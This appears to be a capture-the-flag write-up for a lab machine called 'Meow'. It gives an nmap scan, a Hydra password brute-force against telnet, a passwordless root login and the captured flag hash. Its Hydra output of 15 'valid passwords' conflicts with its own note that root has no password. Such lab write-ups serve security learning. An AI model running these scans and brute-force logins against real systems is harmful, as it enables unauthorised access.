# Meow

TARGET MACHINE IP ADDRESS: 10.129.26.120

## Nmap

```
sudo nmap -sS -sV -sC -T4 -p- 10.129.26.120
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-20 23:18 GMT
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 78.68% done; ETC: 23:19 (0:00:10 remaining)
Nmap scan report for 10.129.26.120
Host is up (0.058s latency).
Not shown: 65334 closed tcp ports (reset), 200 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.44 seconds
```

## Hydra

```
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/password.lst 10.129.26.120 telnet
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-20 23:26:34
[WARNING] telnet is by its nature unreliable to analyze, if possible better choose FTP, SSH, etc. if available
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 88397 login tries (l:1/p:88397), ~5525 tries per task
[DATA] attacking telnet://10.129.26.120:23/
[23][telnet] host: 10.129.26.120   login: root   password: !@#$%
[23][telnet] host: 10.129.26.120   login: root   password: !@#$%^
[23][telnet] host: 10.129.26.120   login: root   password: !@#$%^&
[23][telnet] host: 10.129.26.120   login: root   password: !@#$%^&*
[23][telnet] host: 10.129.26.120   login: root   password: !likable
[23][telnet] host: 10.129.26.120   login: root   password: .net
[23][telnet] host: 10.129.26.120   login: root   password: 0
[23][telnet] host: 10.129.26.120   login: root   password: !kak
[23][telnet] host: 10.129.26.120   login: root   password: !soutpiel
[23][telnet] host: 10.129.26.120   login: root   password: !hotnot
[23][telnet] host: 10.129.26.120   login: root   password: !koedoe
[23][telnet] host: 10.129.26.120   login: root   password: !poes
[23][telnet] host: 10.129.26.120   login: root   password: !pomp
[23][telnet] host: 10.129.26.120   login: root   password: !gatvol
[23][telnet] host: 10.129.26.120   login: root   password: !boerseun
1 of 1 target successfully completed, 15 valid passwords found
```

## Pwn

```
telnet 10.129.26.120
```
- At the prompt enter `root`. That's it. No password set. Just get right in.

## Flag

```
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19
```

![Pasted image 20240220173705](https://github.com/GregKedrovsky/Hacking/assets/26492233/4e701314-ed0c-40b8-9625-56c9dd42108d)

